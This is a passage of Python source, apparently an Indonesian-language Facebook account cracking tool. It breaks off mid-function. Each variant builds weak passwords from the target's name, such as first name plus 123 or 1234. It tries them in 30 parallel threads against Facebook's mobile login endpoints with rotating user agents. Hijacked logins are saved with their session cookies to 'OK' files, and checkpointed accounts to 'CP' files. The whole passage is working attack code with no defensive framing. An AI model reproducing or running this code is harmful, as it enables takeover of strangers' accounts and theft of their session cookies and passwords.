			graha = ses.post('https://free.facebook.com/login/device-based/regular/login/?api_key=124024574287414&auth_token=aa30e288971348c83b38b925ccd4376d&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De1918edc-2ea5-4ace-b98f-17e6c2305ea3%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=head,allow_redirects=False)
			if 'c_user' in ses.cookies.get_dict():
				ok+=1
				kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall('c_user=(.*);xs', kukis)[0]
				tree = Tree(f'[white]┌─[ [bold green]SUCCESSFUL[white] ]',style='blue')
				tree.add(f'[b green]{user}[/]|[b green]{pw}[/]').add(f'[b green]{kukis}[/]')
				cetak(tree)
				open('OK/'+okc,'a').write(user+'|'+pw+'|'+kukis+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				tree = Tree(f'[white]┌─[ [bold yellow]CHECKPOINT[white] ]',style='blue')
				tree.add(f'[b yellow]{user}[/]|[b yellow]{pw}[/]').add(f'[b purple]{ua}[/]')
				cetak(tree)
				open('CP/'+cpc,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def Regular2():
	global prog,des
	cetak(nel(f'Hasil [b green]OK[/] Tersimpan Di : [b green]OK/{okc}',border_style='b blue',padding=(0,6)))
	cetak(nel(f'Hasil [b yellow]CP[/] Tersimpan Di : [b yellow]CP/{cpc}',border_style='b blue',padding=(0,6)))
	text = TextColumn('{task.description}')
	barc = BarColumn(bar_width=None, table_column=Column(ratio=2))
	wakt = TextColumn('{task.percentage:.0f}%')
	prog = Progress(text, barc, wakt, expand=True)
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as nugraha_gans:
			for nugraha_in_here in id2:
				user,nmf = nugraha_in_here.split('|')[0],nugraha_in_here.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				nugraha_gans.submit(Regular_V2,user,pwv)
		text = Text(f'OK : {ok} CP : {cp}',justify='center')
		cetak(nel(text,title=' MALING BERHASIL '))
		exit()

def Regular_V2(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[[b yellow]REGULAR V2[/]] {loop}/{len(id)} OK:-[green]{ok}[/] CP:-[yellow]{cp}[/]")
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(uacrot)
	ua2 = random.choice(reyUaSpecial)
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else: ua
			ses.headers.update({
				"Host": "m.facebook.com",
				"viewport-width": "980",
				"sec-ch-ua": "'Not?A_Brand';v='8', 'Chromium';v='108', 'Google Chrome';v='108'",
				"sec-ch-ua-mobile": "?1",
				"sec-ch-ua-platform": "Android",
				"sec-ch-prefers-color-scheme": "light",
				"save-data": "on",
				"upgrade-insecure-requests": "1",
				"user-agent": ua2,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://m.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fguides%2Faccess-tokens%2F&ref=dbl&fl&login_from_aymh=1",
				"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
				})
			nu = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De1918edc-2ea5-4ace-b98f-17e6c2305ea3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(nu)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(nu)).group(1),
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(nu)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(nu)).group(1),
				"try_number": re.search('name="try_number" value="(.*?)"', str(nu)).group(1),
				"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(nu)).group(1),
				"email": user,
				"pass": pw,
				"prefill_contact_point": user,
				"prefill_source": "browser_onload",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": "false",
				"is_smart_lock": "false",
				"bi_xrwh": "0",
				"_fb_noscript": "true",
				}
			if "Masuk ke akun Facebook Anda untuk terhubung dengan Instagram" in str(nu):
				head = {
				"Host": "m.facebook.com",
				"content-length": "413",
				"cache-control": "max-age=0",
				"viewport-width": "980",
				"sec-ch-ua": "'Not?A_Brand';v='8', 'Chromium';v='108', 'Google Chrome';v='108'",
				"sec-ch-ua-mobile": "?1",
				"sec-ch-ua-platform": "Android",
				"sec-ch-prefers-color-scheme": "light",
				"save-data": "on",
				"upgrade-insecure-requests": "1",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://m.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fguides%2Faccess-tokens%2F&ref=dbl&fl&login_from_aymh=1",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
				}
			graha = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=124024574287414&auth_token=aa30e288971348c83b38b925ccd4376d&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De1918edc-2ea5-4ace-b98f-17e6c2305ea3%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217p3qcdznwcq6oog4mfqldrj06nver81xabheo1og7byod7dv3m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=head,allow_redirects=False)
			if 'c_user' in ses.cookies.get_dict():
				ok+=1
				kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall('c_user=(.*);xs', kukis)[0]
				tree = Tree(f'[white]┌─[ [bold green]SUCCESSFUL[white] ]',style='blue')
				tree.add(f'[b green]{user}[/]|[b green]{pw}[/]').add(f'[b green]{kukis}[/]')
				cetak(tree)
				open('OK/'+okc,'a').write(user+'|'+pw+'|'+kukis+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				tree = Tree(f'[white]┌─[ [bold yellow]CHECKPOINT[white] ]',style='blue')
				tree.add(f'[b yellow]{user}[/]|[b yellow]{pw}[/]').add(f'[b purple]{ua}[/]')
				cetak(tree)
				open('CP/'+cpc,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def Async():
	global prog,des
	cetak(nel(f'Hasil [b green]OK[/] Tersimpan Di : [b green]OK/{okc}',border_style='b blue',padding=(0,6)))
	cetak(nel(f'Hasil [b yellow]CP[/] Tersimpan Di : [b yellow]CP/{cpc}',border_style='b blue',padding=(0,6)))
	text = TextColumn('{task.description}')
	barc = BarColumn(bar_width=None, table_column=Column(ratio=2))
	wakt = TextColumn('{task.percentage:.0f}%')
	prog = Progress(text, barc, wakt, expand=True)
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as nugraha_gans:
			for nugraha_in_here in id2:
				user,nmf = nugraha_in_here.split('|')[0],nugraha_in_here.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				nugraha_gans.submit(AsyncV1,user,pwv)
		text = Text(f'OK : {ok} CP : {cp}',justify='center')
		cetak(nel(text,title=' MALING BERHASIL '))
		exit()

def AsyncV1(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[[b red]ASYNC V1[/]] {loop}/{len(id)} OK:-[green]{ok}[/] CP:-[yellow]{cp}[/]")
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(strv666)
	ua2 = random.choice(uacrot)
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else: ua
			ses.headers.update=({
			'Host':'m.facebook.com',
				'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
				'user-agent':ua2,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			})
			nu = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25223p2uah1qa7wo73pr9jg43rmym73nagb11an4ga1y1x1u5w06k5w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0613c006-078c-4f6e-b54d-44f24e4532d3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25223p2uah1qa7wo73pr9jg43rmym73nagb11an4ga1y1x1u5w06k5w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
			"m_ts": re.search('name="m_ts" value="(.*?)"',str(nu)).group(1),
			"li": re.search('name="li" value="(.*?)"',str(nu)).group(1),
			"try_number": "0",
			"unrecognized_tries": "0",
			"email":user,
			"prefill_contact_point":'https://www.facebook.com/profile.php?id='+user,
			"prefill_source":"browser_dropdown",
			"prefill_type":"contact_point",
			"first_prefill_source":"browser_dropdown",
			"first_prefill_type":"contact_poin",
			"had_cp_prefilled":"true",
			"had_password_prefilled":"false",
			"is_smart_lock":"false",
			"bi_xrwh":"0",
			"encpass":"#PWD_BROWSER:0:"+real_time()+":"+pw,
			"fb_dtsg":"",
			"jazoest": re.search('name="jazoest" value="(.*?)"',str(nu)).group(1),
			"lsd": re.search('name="lsd" value="(.*?)"',str(nu)).group(1),
			"__dyn":"",
			"__csr":"",
			"__req":"3",
			"__a":"",
			"__user":"0"
				}
			if "Masuk ke akun Facebook Anda untuk terhubung dengan Instagram" in str(nu):
				head = {
				'Host':'m.facebook.com',
				'content-length':f'{len(str(data))}',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(nu)).group(1),
				'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
				'content-type':'application/x-www-form-urlencoded',
				'sec-ch-ua-mobile':'?1',
				'user-agent':ua,
				'sec-ch-ua-platform':'"Android"',
				'accept':'*/*',
				'origin':'https://m.facebook.com',
				'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
				'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25223p2uah1qa7wo73pr9jg43rmym73nagb11an4ga1y1x1u5w06k5w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0613c006-078c-4f6e-b54d-44f24e4532d3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25223p2uah1qa7wo73pr9jg43rmym73nagb11an4ga1y1x1u5w06k5w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding':'gzip, deflate, br',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			graha = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=d9b80c05efaecb69a6cc70e938ec6013&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25223p2uah1qa7wo73pr9jg43rmym73nagb11an4ga1y1x1u5w06k5w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0613c006-078c-4f6e-b54d-44f24e4532d3%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25223p2uah1qa7wo73pr9jg43rmym73nagb11an4ga1y1x1u5w06k5w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100',data=data,headers=head,allow_redirects=False)
			if 'c_user' in ses.cookies.get_dict():
				ok+=1
				kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall('c_user=(.*);xs', kukis)[0]
				tree = Tree(f'[b white]┌─[ [bold green]LIVE[b white] ]',style='b green')
				tree.add(f'[b blue]{user}[/]|[b blue]{pw}[/]')
				tree.add(f'[b blue]{kukis}[/]')
				tree.add(f'[b white]─[ [bold green]TUMBEN GANTENG BANG:)[b white] ]')
				cetak(tree)
				open('OK/'+okc,'a').write(user+'|'+pw+'|'+kukis+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				tree = Tree(f'[white]┌─[ [bold yellow]CHEK[white] ]',style='b white')
				tree.add(f'[b red]{user}[/]|[b red]{pw}[/]')
				tree.add(f'[b white]{ua}[/]')
				tree.add(f'[white]─[ [bold yellow]MASIH KURANG HOKI:v[white] ]')
				cetak(tree)
				open('CP/'+cpc,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def Async_V2():
	global prog,des
	cetak(nel(f'Hasil [b green]OK[/] Tersimpan Di : [b green]OK/{okc}',border_style='b blue',padding=(0,6)))
	cetak(nel(f'Hasil [b yellow]CP[/] Tersimpan Di : [b yellow]CP/{cpc}',border_style='b blue',padding=(0,6)))
	text = TextColumn('{task.description}')
	barc = BarColumn(bar_width=None, table_column=Column(ratio=2))
	wakt = TextColumn('{task.percentage:.0f}%')
	prog = Progress(text, barc, wakt, expand=True)
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as nugraha_gans:
			for nugraha_in_here in id2:
				user,nmf = nugraha_in_here.split('|')[0],nugraha_in_here.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				nugraha_gans.submit(AsyncV2,user,pwv)
		text = Text(f'OK : {ok} CP : {cp}',justify='center')
		cetak(nel(text,title=' MALING BERHASIL '))
		exit()

def AsyncV2(user,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[[b red]ASYNC V2[/]] {loop}/{len(id)} OK:-[green]{ok}[/] CP:-[yellow]{cp}[/]")
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(uacrot)
	ua2 = random.choice(ugent)
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else: ua
			ses.headers.update=({
			'Host':'m.facebook.com',
				'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
				'user-agent':ua2,
				'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
				'sec-ch-ua-mobile': '?1',
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
				'sec-fetch-site': 'cross-site',
				'accept-encoding':'gzip, deflate, br',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			})
			nu = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=221901731857165&kid_directed_site=0&app_id=221901731857165&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccount.businessinsider.com%252Fv2.0%252Fauth%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3DeyJleHBpcmVzT24iOiIyMDIzLTAzLTA5VDE5OjA3OjA5LjA4MVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tL3BoaWwtc2NoaWxsZXItaWNsb3VkLTIwMTUtNiJ9%26client_id%3D221901731857165%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdd058b9-1d81-4e8d-9804-d2d0fb35569d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.businessinsider.com%2Fv2.0%2Fauth%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJleHBpcmVzT24iOiIyMDIzLTAzLTA5VDE5OjA3OjA5LjA4MVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tL3BoaWwtc2NoaWxsZXItaWNsb3VkLTIwMTUtNiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
			"m_ts": re.search('name="m_ts" value="(.*?)"',str(nu)).group(1),
			"li": re.search('name="li" value="(.*?)"',str(nu)).group(1),
			"try_number": "0",
			"unrecognized_tries": "0",
			"email":user,
			"prefill_contact_point": "",
			"prefill_source":"browser_dropdown",
			"prefill_type":"password",
			"first_prefill_source":"browser_dropdown",
			"first_prefill_type":"contact_point",
			"had_cp_prefilled":"true",
			"had_password_prefilled":"true",
			"is_smart_lock":"false",
			"bi_xrwh":"0",
			"encpass":"#PWD_BROWSER:5:"+real_time()+":"+pw,
			"jazoest": re.search('name="jazoest" value="(.*?)"',str(nu)).group(1),
			"lsd": re.search('name="lsd" value="(.*?)"',str(nu)).group(1),
			"__dyn":"",
			"__csr":"",
			"__req":"5",
			"__a":"",
			"__user":"0"
							}
			if "Masuk ke akun Facebook Anda untuk terhubung dengan Instagram" in str(nu):
				head = {
				'Host':'m.facebook.com',
				'content-length':f'{len(str(data))}',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(nu)).group(1),
				'x-asbd-id': '198387',
				'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
				'content-type':'application/x-www-form-urlencoded',
				'sec-ch-ua-mobile':'?1',
				'user-agent':ua,
				'sec-ch-ua-platform':'"Android"',
				'accept':'*/*',
				'origin':'https://m.facebook.com',
				'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
				'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/login.php?skip_api_login=1&api_key=221901731857165&kid_directed_site=0&app_id=221901731857165&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccount.businessinsider.com%252Fv2.0%252Fauth%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3DeyJleHBpcmVzT24iOiIyMDIzLTAzLTA5VDE5OjA3OjA5LjA4MVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tL3BoaWwtc2NoaWxsZXItaWNsb3VkLTIwMTUtNiJ9%26client_id%3D221901731857165%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdd058b9-1d81-4e8d-9804-d2d0fb35569d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.businessinsider.com%2Fv2.0%2Fauth%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJleHBpcmVzT24iOiIyMDIzLTAzLTA5VDE5OjA3OjA5LjA4MVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tL3BoaWwtc2NoaWxsZXItaWNsb3VkLTIwMTUtNiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding':'gzip, deflate, br',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			graha = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=221901731857165&auth_token=d50e8782d4a9bd5550340fb8a54d6b72&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccount.businessinsider.com%252Fv2.0%252Fauth%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3DeyJleHBpcmVzT24iOiIyMDIzLTAzLTA5VDE5OjA3OjA5LjA4MVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tL3BoaWwtc2NoaWxsZXItaWNsb3VkLTIwMTUtNiJ9%26client_id%3D221901731857165%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdd058b9-1d81-4e8d-9804-d2d0fb35569d%26tp%3Dunspecified&refsrc=deprecated&app_id=221901731857165&cancel=https%3A%2F%2Faccount.businessinsider.com%2Fv2.0%2Fauth%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJleHBpcmVzT24iOiIyMDIzLTAzLTA5VDE5OjA3OjA5LjA4MVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tL3BoaWwtc2NoaWxsZXItaWNsb3VkLTIwMTUtNiJ9%23_%3D_&lwv=100',data=data,headers=head,allow_redirects=False)
			if 'c_user' in ses.cookies.get_dict():
				ok+=1
